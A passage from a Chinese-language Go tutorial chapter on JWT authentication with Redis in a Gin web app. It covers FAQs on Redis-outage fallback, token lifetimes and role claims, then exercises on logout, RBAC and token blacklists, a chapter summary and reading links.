**A:** 会受影响。我们的方案中,Redis 用于存储 Token 状态,Redis 宕机会导致:

1. **登录功能失效**: `SetUserToken()` 失败。
2. **认证失败**: 中间件无法从 Redis 获取 Token,所有请求被拒绝。

**降级方案:**

可以在中间件中添加降级逻辑:

```go
// 4. Redis 校验 (单点登录/互踢的核心)
redisToken, err := redis.GetUserAccessToken(mc.UserID)
if err != nil {
    // 检查是否是 Redis 连接错误
    if errors.Is(err, redis.ErrRedisDown) {
        // 降级:跳过 Redis 验证,仅依赖 JWT 签名
        zap.L().Warn("Redis is down, fallback to JWT-only validation")
        c.Set(controller.CtxUserIDKey, mc.UserID)
        c.Next()
        return
    }
    // 其他错误 (如 Key 不存在),正常拒绝
    controller.ResponseError(c, controller.CodeNeedLogin)
    c.Abort()
    return
}
```

**注意:** 降级后会失去单点登录的功能,需要权衡。

### Q3: 为什么 Access Token 有效期设置为 10 分钟?

**A:** 这是一个平衡安全性和用户体验的选择:

- **太短 (如 1 分钟)**: 用户频繁刷新 Token,影响体验。
- **太长 (如 1 天)**: Token 泄露后,攻击者可以长时间使用。

**推荐配置:**

- **内部管理系统**: Access Token 30 分钟,Refresh Token 7 天。
- **面向用户的应用**: Access Token 10 分钟,Refresh Token 30 天。
- **高安全场景 (如银行)**: Access Token 5 分钟,Refresh Token 1 天。

### Q4: 可以在 UserClaims 中添加 `Role` 字段实现权限控制吗?

**A:** 可以,但不推荐。原因:

1. **权限变更不及时**: 管理员修改了用户角色,但 Token 在过期前仍使用旧角色。
2. **Token 体积增大**: 如果权限信息复杂 (如多个角色、多个权限点),Token 会很大。

**推荐做法:**

- **方案一**: Token 只存储 UserID,每次请求时查询数据库/缓存获取最新权限。
- **方案二**: 使用短有效期 (如 5 分钟),权限变更可以在 5 分钟内生效。

### Q5: 如何实现"记住我"功能?

**A:** 可以根据用户勾选"记住我"来动态调整 Refresh Token 的有效期:

```go
// 登录时,根据 rememberMe 参数设置不同的过期时间
func Login(p *models.ParamLogin) (aToken, rToken string, err error) {
    // ... 前面的验证逻辑 ...

    // 生成 Token
    aToken, rToken, err = jwt.GenToken(user.UserID, user.Username)
    if err != nil {
        return "", "", err
    }

    // 根据 rememberMe 设置不同的过期时间
    var rExp time.Duration
    if p.RememberMe {
        rExp = time.Hour * 24 * 90  // 记住我: 90 天
    } else {
        rExp = jwt.RefreshTokenExpireDuration  // 不记住: 30 天
    }

    // 存储到 Redis
    err = redis.SetUserToken(user.UserID, aToken, rToken, jwt.AccessTokenExpireDuration, rExp)
    if err != nil {
        return "", "", err
    }

    return aToken, rToken, nil
}
```

---

## 9. 课后练习

### 练习 1: 实现登出功能

**需求:** 实现 `/api/v1/logout` 接口,删除 Redis 中的 Token,强制用户下线。

**提示:**

```go
// Controller
func LogoutHandler(c *gin.Context) {
    // 1. 获取当前用户 ID
    userID, err := GetCurrentUser(c)
    if err != nil {
        ResponseError(c, CodeNeedLogin)
        return
    }

    // 2. 删除 Redis 中的 Token
    // TODO: 调用 redis.DeleteUserToken()

    // 3. 返回成功
    ResponseSuccess(c, nil)
}
```

### 练习 2: 实现基于角色的权限控制 (RBAC)

**需求:** 在 `UserClaims` 中添加 `Role` 字段 (如 "admin", "user"),并编写 `RoleAuthMiddleware` 中间件,只允许特定角色访问某些接口。

**提示:**

```go
// UserClaims 添加 Role 字段
type UserClaims struct {
    UserID   int64  `json:"user_id"`
    Username string `json:"username"`
    Role     string `json:"role"`  // 新增
    jwt.RegisteredClaims
}

// 中间件示例
func AdminOnlyMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // TODO: 从上下文获取 Role,判断是否为 "admin"
    }
}
```

### 练习 3: Token 黑名单

**需求:** 实现 Token 黑名单机制,当用户登出或修改密码时,将旧 Token 加入黑名单,禁止其继续使用。

**提示:**

```go
// Redis Key: bluebell:token:blacklist:{token}
// 过期时间与 Token 的剩余有效期一致

// 登出时
func Logout(userID int64, token string) error {
    // 1. 解析 Token 获取过期时间
    claims, _ := jwt.ParseToken(token)
    ttl := time.Until(claims.ExpiresAt.Time)

    // 2. 加入黑名单
    return redis.AddToBlacklist(token, ttl)
}

// 中间件中添加黑名单检查
func JWTAuthMiddleware() func(c *gin.Context) {
    return func(c *gin.Context) {
        // ...

        // 检查黑名单
        if redis.IsInBlacklist(parts[1]) {
            ResponseError(c, CodeInvalidToken)
            c.Abort()
            return
        }

        // ...
    }
}
```

**参考答案:** 请查看本章的 `solutions` 目录 (TODO: 创建答案文件)

---

## 10. 本章总结

本章我们完成了 JWT 认证系统的完整实现,核心要点回顾:

### 技术实现

1. ✅ **JWT 三部分**: Header (算法) + Payload (数据) + Signature (签名)
2. ✅ **双 Token 机制**: Access Token (短效) + Refresh Token (长效)
3. ✅ **JWT + Redis 混合**: 解决 JWT 难撤销的问题,实现单点登录
4. ✅ **Gin 中间件**: 统一的认证拦截,注入用户上下文

### 安全实践

1. ✅ **HTTPS 必须**: 防止 Token 被截获
2. ✅ **Secret 管理**: 不要硬编码,从配置文件读取
3. ✅ **不存敏感信息**: Payload 只存非敏感的标识信息
4. ✅ **防 XSS/CSRF**: HttpOnly Cookie + CSP Header

### 架构设计

```
HTTP 请求
    ↓
Gin 中间件 (JWTAuthMiddleware + tokenCache 注入)
    ├─ 解析 Token (JWT 验证)
    ├─ 通过 Repository 接口查询 Redis (状态验证)
    └─ 注入 UserID 到上下文
    ↓
Handler (h.Services.User.Login 等方法)
    └─ 通过 GetCurrentUser() 获取用户信息
```

### 下一章预告

在第09章中,我们将深入探讨 **Refresh Token 最佳实践**,包括:
- 如何安全地刷新 Access Token
- Refresh Token 的生命周期管理
- 刷新失败的降级策略
- 防止 Refresh Token 被盗用

---

## 11. 延伸阅读

- 📖 [JWT 官网 (调试工具)](https://jwt.io/)
- 📖 [RFC 7519: JSON Web Token](https://tools.ietf.org/html/rfc7519)
- 📖 [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- 📖 [golang-jwt/jwt GitHub](https://github.com/golang-jwt/jwt)
- 📖 下一章: [第09章:Refresh Token 最佳实践](./09-Refresh_Token_最佳实践.md)
